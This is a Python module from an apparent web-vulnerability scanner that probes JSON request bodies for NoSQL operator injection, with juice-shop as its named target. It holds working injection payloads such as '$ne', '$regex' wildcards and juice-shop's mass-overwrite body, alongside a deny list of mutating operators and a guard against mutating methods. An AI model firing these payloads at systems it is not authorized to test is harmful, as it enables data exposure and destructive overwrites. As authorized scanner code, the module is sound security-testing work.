"""
NoSQL operator injection carried in a JSON REQUEST BODY (Q-155).

THIS MODULE ADDS A CARRIER, NOT AN ORACLE.
==========================================================================================
`nosqli_tool.analyze_boolean` is imported and used verbatim. Every verdict in this file is
that function's verdict. The differential is unchanged and is still:

    an operator that broadens the match back to baseline-shaped output,
    while a plain non-matching control on the same field does not.

What was missing was never the oracle. `tools._run_nosqli` appends an operator to a
parameter NAME on a query string -- `id[$ne]=`, `id[$regex]=` -- and that reaches exactly
one of the two places Mongo-style injection lives. The other is a JSON body, where the
operator is a real nested object:

    {"id": {"$ne": "abc_bbh_7f2a"}}          not      ?id[$ne]=abc_bbh_7f2a

and no amount of query-string probing reaches it. MEASURED for Q-155: 12 `run_nosqli`
dispatches against juice-shop returned 0 results while juice-shop's Mongo-style store
(reviews, `_id` documents) is reached only through JSON bodies. The engine was right about
every URL it was handed and was never handed the shape that carries the bug.

`tools._run_form_nosqli` already POSTs a JSON body, so the gap looks closed from the tool
list. It is not: that engine is scoped to LOGIN fields (`nosqli_tool.LOGIN_FIELD_HINTS`) and
uses the AUTH-BYPASS oracle (a token issued where none had been). A search or list endpoint
that broadens its result set issues no token and was already 200, so that oracle is
structurally incapable of seeing it. The two engines are complementary, not redundant.

PROBE WITH OBSERVED VALUES, NEVER INVENTED ONES.
==========================================================================================
This project has been bitten three separate times by an engine that probed with a made-up
value: the baseline and the probe then failed identically, the differential was zero, and
the engine reported CLEAN on a genuinely vulnerable field. `tools._run_form_nosqli` still
builds its baseline credential with `os.urandom` -- survivable there only because its oracle
does not depend on the baseline matching anything, and NOT survivable for a broadening
oracle.

So every value in this module is a mutation of the value the application itself showed us:

    observed    "YxAfD6AN5Bk3h3Zeo"                          (from the captured request)
    control     "YxAfD6AN5Bk3h3Zeo_bbh_a1b2"                 plain, cannot match
    operator    {"$ne": "YxAfD6AN5Bk3h3Zeo_bbh_a1b2"}        matches everything BUT that

The operator's argument is the SAME string as the control's plain value. That is what makes
the pair a differential rather than two unrelated requests: the only difference between the
control body and the operator body is one level of JSON nesting. `nonmatching_value` is
asserted in the test suite to carry the observed value, so an invented probe cannot be
reintroduced without turning a test red.

READ-ONLY PAYLOADS.
==========================================================================================
Two independent guards, because "read-only" means two different things here.

  * `READ_ONLY_OPERATORS` / `is_read_only_payload` -- the payload never contains a mutating
    or code-executing operator ($set, $unset, $where, $function, $out, ...). Enforced on
    every body this module emits, with a negative control in the tests.
  * `method_verdict` -- a BROADENING operator sent with a mutating method does not read
    extra documents, it MUTATES extra documents. juice-shop's own body-NoSQLi endpoint,
    `PATCH /rest/products/reviews`, is exactly that: the canonical `{"id": {"$ne": -1}}`
    payload overwrites every review in the store. A read-only payload on a write method is
    still a destructive request, so the mutating methods are refused by default and the
    refusal is REPORTED, never silent.

Pure and deterministic except for `probe_json_body`, which takes its transport as an
injected `send` callable so the whole carrier is unit-testable with no network.
"""
from __future__ import annotations

import copy
import json
import re

# The oracle. Imported, not reimplemented -- a second copy of "did the match broaden" is how
# two engines start disagreeing about what they saw.
from nosqli_tool import (Inconclusive, analyze_boolean,  # noqa: F401  (re-exported)
                         error_signatures, is_inconclusive)

# ---------------------------------------------------------------------------------------
# Operators
# ---------------------------------------------------------------------------------------

#: Match-only operators. Evaluating one of these cannot write, delete or execute anything --
#: it can only change WHICH documents a filter selects, which is precisely the observable the
#: boolean oracle reads.
READ_ONLY_OPERATORS = frozenset({"$ne", "$gt", "$gte", "$lt", "$lte", "$in", "$nin",
                                 "$regex", "$options", "$exists", "$type", "$all", "$size",
                                 "$not", "$and", "$or", "$nor", "$eq"})

#: Named so the exclusion is a fact in the code rather than a claim in a comment. Nothing in
#: this module may emit any of these, and `test_nosqli_body` feeds each one to
#: `is_read_only_payload` as a negative control.
MUTATING_OPERATORS = frozenset({"$set", "$unset", "$rename", "$inc", "$mul", "$min", "$max",
                                "$currentDate", "$push", "$pop", "$pull", "$pullAll",
                                "$addToSet", "$bit", "$setOnInsert", "$out", "$merge",
                                "$where", "$function", "$accumulator", "$expr", "$replaceRoot",
                                "$replaceWith", "$unionWith", "$graphLookup"})

#: Methods whose semantics do not mutate the SET a filter selects. A broadened filter here
#: returns more rows; it does not touch more rows.
NON_MUTATING_METHODS = ("GET", "HEAD", "POST", "SEARCH", "QUERY", "REPORT")

#: Methods where broadening the filter broadens the BLAST RADIUS. Refused unless the caller
#: opts in explicitly -- see `method_verdict`.
MUTATING_METHODS = ("PUT", "PATCH", "DELETE")

#: Appended to an observed value to build a value that cannot match it. Overridable per call
#: so tests are deterministic; `probe_json_body` supplies a random one in production.
DEFAULT_TAG = "bbh"

#: Added to an observed NUMBER to build a non-matching number. A number has no room for a
#: suffix, so the mutation is arithmetic; it is still a FUNCTION OF THE OBSERVED VALUE, which
#: the tests assert by checking the offset is identical across two different observations.
NUMERIC_OFFSET = 982451653

#: The operator payloads whose ARGUMENT is a match-everything WILDCARD rather than a substituted
#: value. Named because the "probe with observed values, never invented ones" rule needs a stated
#: boundary: the rule exists because an invented VALUE can fail for a reason unrelated to the
#: field, so the probe and the baseline fail identically and a vulnerable field reads clean. A
#: wildcard cannot fail that way -- `.*` matches every string there is, by construction. So these
#: two are the ONLY probe arguments in this module not derived from the observation, and
#: `test_only_declared_wildcards_are_ungrounded` pins the list so a third cannot be slipped in.
WILDCARD_PAYLOADS = ({"$regex": ".*"}, {"$gt": ""})

#: Per-field operator cap. Each operator is another remote round trip on top of the control
#: and the omit request, and this engine runs alongside sqli/cmdi/xss on the same endpoint.
MAX_OPERATORS_PER_FIELD = 2

#: Default field cap. `_run_nosqli` bounds itself to 4 query params for the same reason.
MAX_FIELDS = 4

#: Depth bound on the body walk. A filter nested deeper than this is vanishingly rare and the
#: walk cost is not worth paying on a large document.
MAX_DEPTH = 4

#: A value long enough to be prose rather than a filter key. Mutating it bloats every probe
#: body and the app is not matching a document on it.
MAX_VALUE_LEN = 512

#: Ordering hint ONLY -- never a filter. Fields whose name looks like an identifier are probed
#: first because the field cap is small, but a field that matches nothing here is still
#: probed. Restricting the candidate set to these names would be a signature, not an engine.
_ID_ISH = re.compile(r"(^|[_.\-])(id|ids|_id|uid|guid|uuid|key|slug|ref|code|sku|token|name|"
                     r"email|user|username|owner|type|status|category|q|query|search|filter|"
                     r"term|keyword)([_.\-]|$)|id$", re.IGNORECASE)


# ---------------------------------------------------------------------------------------
# Body parsing and traversal
# ---------------------------------------------------------------------------------------

def parse_body(raw):
    """The observed request body as a JSON container, or None.

    None means "this carrier does not apply", not "this endpoint is clean" -- a form-encoded
    or XML body is somebody else's engine. Returns only dict/list; a bare JSON scalar has no
    field to inject into.
    """
    if isinstance(raw, (dict, list)):
        return copy.deepcopy(raw)
    if isinstance(raw, bytes):
        try:
            raw = raw.decode("utf-8", "replace")
        except Exception:
            return None
    if not isinstance(raw, str) or not raw.strip():
        return None
    try:
        obj = json.loads(raw)
    except Exception:
        return None
    return obj if isinstance(obj, (dict, list)) else None


def _is_scalar(v) -> bool:
    """A value an application can match a document on. `bool` is excluded deliberately: it is
    an `int` subclass in Python, and a flag is a branch selector, not a filter key -- replacing
    one with an operator object tests the framework's type coercion, not its query builder."""
    if isinstance(v, bool) or v is None:
        return False
    return isinstance(v, (str, int, float))


def walk_scalars(obj, max_depth: int = MAX_DEPTH):
    """(path, value) for every scalar in the body, depth-first, in document order.

    `path` is a tuple of dict keys and list indices, so `("filter", "tags", 0)` addresses
    `body["filter"]["tags"][0]`. Order is the body's own order, which is what makes the
    candidate list stable across runs.
    """
    out = []

    def _walk(node, path, depth):
        if depth > max_depth:
            return
        if isinstance(node, dict):
            for k, v in node.items():
                if not isinstance(k, str):
                    continue
                _walk(v, path + (k,), depth + 1)
        elif isinstance(node, list):
            for i, v in enumerate(node):
                _walk(v, path + (i,), depth + 1)
        elif _is_scalar(node):
            out.append((path, node))

    _walk(obj, (), 0)
    return out


def get_at(obj, path):
    """The value at `path`, or None if the path does not resolve."""
    cur = obj
    for step in path:
        try:
            cur = cur[step]
        except Exception:
            return None
    return cur


def set_at(obj, path, value):
    """A DEEP COPY of `obj` with `path` set to `value`. Never mutates the caller's body --
    the observed request is reused for every field's probe set, so mutating it in place would
    make each probe depend on the last one's leftovers."""
    if not path:
        return copy.deepcopy(value)
    new = copy.deepcopy(obj)
    cur = new
    for step in path[:-1]:
        cur = cur[step]
    cur[path[-1]] = value
    return new


def omit_at(obj, path):
    """A DEEP COPY of `obj` with the leaf at `path` removed entirely.

    The JSON-body analogue of `nosqli_tool.missing_param_url`, and it exists for the same
    false-positive shape: if the operator response looks like the response with the field
    ABSENT, the application is discarding a value it could not coerce rather than evaluating
    an operator. That is the dominant FP on frameworks that type-check their input, and it
    must not be reported.
    """
    if not path:
        return None
    new = copy.deepcopy(obj)
    cur = new
    for step in path[:-1]:
        cur = cur[step]
    try:
        if isinstance(cur, list):
            del cur[path[-1]]
        else:
            cur.pop(path[-1], None)
    except Exception:
        return None
    return new


def path_label(path) -> str:
    """`("filter", "tags", 0)` -> `"filter.tags[0]"`. The name a finding reports, so a reader
    can find the field in their own request body."""
    out = ""
    for step in path:
        if isinstance(step, int):
            out += "[%d]" % step
        else:
            out += ("." + step) if out else step
    return out or "(body)"


# ---------------------------------------------------------------------------------------
# Candidate selection
# ---------------------------------------------------------------------------------------

def candidate_fields(obj, max_fields: int = MAX_FIELDS, max_depth: int = MAX_DEPTH):
    """The body fields worth probing, identifier-looking ones first.

    EXCLUDED, each for a reason that is not "it looked unlikely":
      * empty strings -- the mutation would carry no observed value, which is the exact
        failure mode this module exists to avoid;
      * strings longer than `MAX_VALUE_LEN` -- prose, not a filter key;
      * booleans and nulls -- see `_is_scalar`.

    ORDERED, not filtered, by `_ID_ISH`. The field cap is small, so probing `id` before
    `description` matters; refusing to probe `description` at all would be a signature.
    """
    cands = [(p, v) for p, v in walk_scalars(obj, max_depth)
             if not (isinstance(v, str) and (not v.strip() or len(v) > MAX_VALUE_LEN))]
    ranked = sorted(enumerate(cands),
                    key=lambda iv: (0 if _ID_ISH.search(path_label(iv[1][0])) else 1, iv[0]))
    return [c for _, c in ranked][:max_fields]


# ---------------------------------------------------------------------------------------
# Probe construction -- derived from the observed value, never invented
# ---------------------------------------------------------------------------------------

def nonmatching_value(observed, tag: str = DEFAULT_TAG):
    """A value that cannot match `observed` and is DERIVED FROM IT.

    For a string the observed value is kept as a prefix, so a probe can never degenerate into
    an invented token that fails for a reason unrelated to the field. For a number there is no
    room for a suffix, so the mutation is a fixed arithmetic offset -- still a function of the
    observation, which `test_nonmatching_number_is_a_function_of_the_observation` pins.
    """
    if isinstance(observed, bool):
        raise TypeError("booleans are not filterable values; candidate_fields excludes them")
    if isinstance(observed, str):
        return "%s_%s" % (observed, tag)
    if isinstance(observed, int):
        return observed + NUMERIC_OFFSET
    if isinstance(observed, float):
        return observed + float(NUMERIC_OFFSET)
    raise TypeError("unsupported observed value type: %r" % type(observed))


def operator_payloads(observed, control_value):
    """The operator objects to try against one field, highest signal first.

    `$ne` is primary and is the ONLY one used for both types: `{"$ne": control_value}` selects
    every document EXCEPT the one the control could not find, so a vulnerable field returns a
    SUPERSET of the baseline while the control returns nothing. That superset relationship is
    exactly what `analyze_boolean`'s containment test reads.

    The second operator differs by type because Mongo's do:
      * strings  -- `{"$gt": ""}`, every string sorts above the empty string;
      * numbers  -- `{"$gt": observed - NUMERIC_OFFSET}`, a bound BELOW the observed value and
        therefore derived from it, rather than an invented sentinel like `-1`.

    `$regex` is deliberately NOT emitted for numbers: Mongo raises on a regex against a
    non-string, which produces a driver error that the error oracle would then read as a
    finding -- a false positive manufactured by the probe itself.
    """
    ops = [{"op": "$ne", "payload": {"$ne": control_value},
            "ctx": "$ne against a non-matching value derived from the observed one "
                   "(should broaden the match to everything else)"}]
    if isinstance(observed, str):
        ops.append({"op": "$regex", "payload": dict(WILDCARD_PAYLOADS[0]),
                    "ctx": "$regex wildcard (should match everything)"})
        ops.append({"op": "$gt", "payload": dict(WILDCARD_PAYLOADS[1]),
                    "ctx": "$gt \"\" (every string sorts above the empty string)"})
    else:
        ops.append({"op": "$gt", "payload": {"$gt": observed - NUMERIC_OFFSET},
                    "ctx": "$gt a bound below the observed value (should match everything above it)"})
    return ops[:MAX_OPERATORS_PER_FIELD]


def is_read_only_payload(obj) -> bool:
    """False if any `$`-prefixed key anywhere in `obj` is not a match-only operator.

    A GUARD THAT CHECKS A FACT, NOT A DECLARATION. It walks the body that is about to be sent
    rather than trusting the constant list that built it, so a future operator added to
    `operator_payloads` without being added to `READ_ONLY_OPERATORS` is caught by the guard
    and not by production. `test_read_only_guard_rejects_every_mutating_operator` is its
    negative control.
    """
    stack = [obj]
    while stack:
        node = stack.pop()
        if isinstance(node, dict):
            for k, v in node.items():
                if isinstance(k, str) and k.startswith("$") and k not in READ_ONLY_OPERATORS:
                    return False
                stack.append(v)
        elif isinstance(node, list):
            stack.extend(node)
    return True


def build_probe(obj, path, tag: str = DEFAULT_TAG) -> dict:
    """The full request set for ONE field: baseline, control, omit, and the operator bodies.

    Returns objects, not strings, so a caller can inspect them; `dumps` serialises. The
    baseline is the OBSERVED BODY UNCHANGED -- there is nothing to build, and that is the
    point: the reference request is the application's own request.
    """
    observed = get_at(obj, path)
    if not _is_scalar(observed):
        raise ValueError("no scalar at %s" % path_label(path))
    ctl = nonmatching_value(observed, tag)
    ops = []
    for spec in operator_payloads(observed, ctl):
        body = set_at(obj, path, spec["payload"])
        if not is_read_only_payload(body):     # cannot happen; asserted rather than assumed
            continue
        ops.append({"op": spec["op"], "ctx": spec["ctx"], "body": body,
                    "payload": spec["payload"]})
    return {
        "path": path, "label": path_label(path), "observed": observed, "control_value": ctl,
        "baseline": copy.deepcopy(obj),
        "control": set_at(obj, path, ctl),
        "omit": omit_at(obj, path),
        "operators": ops,
    }


def dumps(obj) -> str:
    """One serialiser for every probe body, so the baseline and the probes differ in their
    CONTENT and never in their formatting."""
    return json.dumps(obj, separators=(",", ":"), sort_keys=False)


# ---------------------------------------------------------------------------------------
# Method gate
# ---------------------------------------------------------------------------------------

def method_verdict(method: str, allow_mutating: bool = False) -> tuple:
    """(ok, reason). Whether a BROADENING operator may be sent with this method.

    NOT over-caution, and not a weakened oracle -- a different question. `$ne` is a read-only
    operator, but `PATCH /rest/products/reviews` with `{"id": {"$ne": -1}}` is juice-shop's
    famous mass-overwrite: on a mutating method a broadened filter selects more documents TO
    WRITE. That request destroys a shared lab, so it is refused by default.

    The refusal is returned, not swallowed, so the caller reports "declined on a mutating
    method" instead of "0 confirmed" -- a truncated sweep and a clean sweep are different
    facts about the target.
    """
    m = (method or "").strip().upper()
    if not m:
        return False, "no request method was observed"
    if m in NON_MUTATING_METHODS:
        return True, ""
    if m in MUTATING_METHODS:
        if allow_mutating:
            return True, ""
        return False, ("%s is a mutating method: a broadened filter selects more documents to "
                       "WRITE, not more to read. Refused unless allow_mutating is set." % m)
    return False, "unrecognised method %r" % m


# ---------------------------------------------------------------------------------------
# Verdict
# ---------------------------------------------------------------------------------------

def verdict(baseline_body: str, operator_body: str, control_body: str,
            omit_body: str = None, baseline_samples=None):
    """`nosqli_tool.analyze_boolean`, named for this carrier. True / False / Inconclusive.

    The omit response is passed as `missing_body`: the JSON-body analogue of "the framework
    treated `param[$op]` as an absent parameter". `baseline_samples` carries the repeat
    references through, so this carrier gets the stability control `_run_nosqli` has to
    supply positionally.
    """
    return analyze_boolean(baseline_body, operator_body, control_body, omit_body,
                           baseline_samples=baseline_samples)


# ---------------------------------------------------------------------------------------
# Findings
# ---------------------------------------------------------------------------------------

def body_finding(url: str, method: str, label: str, ctx: str, payload, control_value,
                 baseline_len: int, operator_len: int, control_len: int,
                 control_request: str = "") -> dict:
    """A confirmed boolean-blind NoSQL injection reached through a JSON body field.

    The evidence string carries the tokens `proof_schema`'s `sql_injection` rule requires
    (the `nosqli` family aliases to it): a database noun, the word `boolean`, the literal
    payload, and the request line. It also records `negative_controls`, one of
    `proof_schema.CONTROL_KEYS`, so the control is an ARTIFACT and not a claim.
    """
    ev = ("boolean-blind NoSQL database differential in JSON body field '%s': the operator "
          "payload %s broadened the match (operator response %d bytes, containing the "
          "baseline's %d) while the plain non-matching control %r on the SAME field returned "
          "%d bytes -- %s %s"
          % (label, json.dumps(payload), operator_len, baseline_len, control_value,
             control_len, (method or "POST").upper(), url))
    f = {
        "title": "NoSQL injection (boolean-blind, JSON body) in '%s'" % label,
        "param": label, "severity": "high", "target": url,
        "description": (
            "The JSON request body field '%s' is passed into a NoSQL query without validating "
            "its TYPE, so a nested operator object is evaluated as query syntax instead of "
            "being matched as a value. Replacing the observed value with %s (%s) broadened the "
            "result set to contain the baseline's documents and more, while the identical body "
            "carrying the same value as a PLAIN string matched nothing. Query-string probing "
            "cannot reach this: the operator has to be a real nested object in the body."
            % (label, json.dumps(payload), ctx)),
        "impact": ("Read or modify the NoSQL store: bypass authentication, dump or alter documents "
                   "outside the caller's scope, and -- depending on the driver -- reach "
                   "$where/JS execution."),
        "reproduction_steps": [
            "Capture the application's own %s %s request and keep its body verbatim"
            % ((method or "POST").upper(), url),
            "Replace the value of '%s' with the plain non-matching value %r and observe that "
            "it matches nothing (the negative control)" % (label, control_value),
            "Replace it instead with the nested object %s and observe the result set broaden "
            "back to contain the baseline's documents" % json.dumps(payload),
            "Escalate by inferring values one operator at a time (authorized testing only)",
        ],
        "evidence": ev,
        "negative_controls": [{
            "kind": "plain-value control",
            "why": ("the same field, the same request, the same value -- with the operator "
                    "object flattened to a plain scalar. It must NOT match."),
            "request": control_request or "%s %s" % ((method or "POST").upper(), url),
            "value": control_value, "response_len": control_len,
        }],
        "cwe": "CWE-943", "family": "nosqli",
        "tags": ["nosqli", "json-body", "boolean-blind"], "confidence": "confirmed",
    }
    return f


def error_body_finding(url: str, method: str, label: str, payload, hits: list,
                       control_value=None, control_len: int = -1) -> dict:
    """Driver-error variant. Same oracle as `nosqli_tool.error_finding`, reported against a
    body field rather than a query parameter."""
    store = ", ".join(sorted({h["store"] for h in hits}))
    return {
        "title": "NoSQL injection (error-based, JSON body) in '%s'" % label,
        "param": label, "severity": "high", "target": url,
        "description": ("A NoSQL operator object in the JSON body field '%s' produced a %s "
                        "driver error absent from the baseline response, so the field reaches "
                        "a NoSQL query unsanitised." % (label, store)),
        "impact": ("Read or modify the NoSQL store: bypass authentication, dump or alter documents "
                   "outside the caller's scope, and -- depending on the driver -- reach "
                   "$where/JS execution."),
        "reproduction_steps": [
            "Capture the application's own %s %s request body" % ((method or "POST").upper(), url),
            "Set '%s' to the operator payload %s" % (label, json.dumps(payload)),
            "Observe a %s database driver error/stack trace absent from the baseline" % store,
        ],
        "evidence": ("%s database driver error triggered by the boolean operator payload %s in "
                     "JSON body field '%s' -- %s %s"
                     % (store, json.dumps(payload), label, (method or "POST").upper(), url)),
        "cwe": "CWE-943", "family": "nosqli",
        "tags": ["nosqli", "json-body", "error-based"], "confidence": "confirmed",
    }


# ---------------------------------------------------------------------------------------
# The carrier
# ---------------------------------------------------------------------------------------

def _text(resp) -> str:
    if not isinstance(resp, dict):
        return ""
    return resp.get("body") or ""


def _ok(resp) -> bool:
    return isinstance(resp, dict) and not resp.get("error") and bool(resp.get("status"))


async def probe_json_body(send, url: str, method: str, raw_body, *, headers: dict = None,
                          max_fields: int = MAX_FIELDS, tag: str = DEFAULT_TAG,
                          allow_mutating: bool = False, baseline_repeats: int = 1) -> dict:
    """Drive the carrier over an injected transport.

    `send(method, url, headers, body_str)` is awaited and must return `tools.ToolRegistry._http`'s
    shape: `{"status": int, "body": str, "error": str|None, ...}`. Taking the transport as an
    argument is what makes the CARRIER -- not just the pure helpers -- unit-testable with no
    network, which is the difference between a tested module and a tested half of a module.

    Returns `{"findings": [...], "requests": int, "fields": [...], "skipped": str,
              "inconclusive": [...]}`. `skipped` is a REASON, never an empty result dressed up
    as a clean one.
    """
    hdrs = dict(headers or {})
    hdrs.setdefault("Content-Type", "application/json")
    out = {"findings": [], "requests": 0, "fields": [], "skipped": "", "inconclusive": []}

    ok, why = method_verdict(method, allow_mutating)
    if not ok:
        out["skipped"] = why
        return out

    obj = parse_body(raw_body)
    if obj is None:
        out["skipped"] = "the observed request body is not a JSON object/array"
        return out

    cands = candidate_fields(obj, max_fields)
    if not cands:
        out["skipped"] = "the JSON body carries no scalar field that can hold a filter value"
        return out

    async def _send(body_obj):
        out["requests"] += 1
        return await send(method.upper(), url, hdrs, dumps(body_obj))

    # The reference request is the application's OWN request, sent verbatim. Repeated at least
    # once so `analyze_boolean` can refuse an endpoint whose output is not a function of its
    # input -- on such an endpoint a containment differential is a coin flip, not evidence
    # (nosqli_tool.analyze_boolean, Q-040/Q-070).
    base_r = await _send(obj)
    if not _ok(base_r):
        out["skipped"] = ("the baseline request did not complete (status %r), so no reference "
                          "was ever established" % (base_r or {}).get("status"))
        return out
    base_body = _text(base_r)
    samples = []
    # Clamped to at least one repeat ON PURPOSE. With an empty sample list `analyze_boolean`
    # returns Inconclusive for everything (its `refs` would be length 1), so a caller passing 0
    # would silently disable the engine rather than disable the control. Refusing to run without
    # a stability reference is the safe direction; running without one is not an option offered.
    for _ in range(max(1, baseline_repeats)):
        r = await _send(obj)
        samples.append(_text(r) if _ok(r) else None)

    for path, _observed in cands:
        probe = build_probe(obj, path, tag)
        label = probe["label"]
        out["fields"].append(label)

        ctl_r = await _send(probe["control"])
        ctl_body = _text(ctl_r) if _ok(ctl_r) else ""
        # The error oracle gets a negative control too. If the PLAIN non-matching value already
        # provokes the same driver signature, that error is about the VALUE (a cast/validation
        # failure on an id the store does not hold) and not about the OPERATOR, and reporting it
        # would be a false positive manufactured by our own probe. Only signatures the operator
        # produces and the control does not survive.
        ctl_error_patterns = {h["pattern"] for h in error_signatures(base_body, ctl_body)}
        omit_body = None
        if probe["omit"] is not None:
            omit_r = await _send(probe["omit"])
            omit_body = _text(omit_r) if _ok(omit_r) else None

        confirmed = False
        for spec in probe["operators"]:
            op_r = await _send(spec["body"])
            if not _ok(op_r):
                continue
            op_body = _text(op_r)

            hits = [h for h in error_signatures(base_body, op_body)
                    if h["pattern"] not in ctl_error_patterns]
            if hits:
                out["findings"].append(error_body_finding(url, method, label, spec["payload"],
                                                          hits, probe["control_value"],
                                                          len(ctl_body)))
                confirmed = True
                break

            v = verdict(base_body, op_body, ctl_body, omit_body, baseline_samples=samples)
            if is_inconclusive(v):
                out["inconclusive"].append({"field": label, "op": spec["op"], "why": str(v)})
                continue
            if v:
                out["findings"].append(body_finding(
                    url, method, label, spec["ctx"], spec["payload"], probe["control_value"],
                    len(base_body), len(op_body), len(ctl_body),
                    control_request="%s %s %s" % (method.upper(), url, dumps(probe["control"]))))
                confirmed = True
                break
        if confirmed:
            continue
    return out
